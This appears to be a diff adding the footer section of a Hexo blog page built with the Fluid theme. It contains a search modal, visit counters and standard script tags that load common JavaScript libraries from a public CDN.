+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
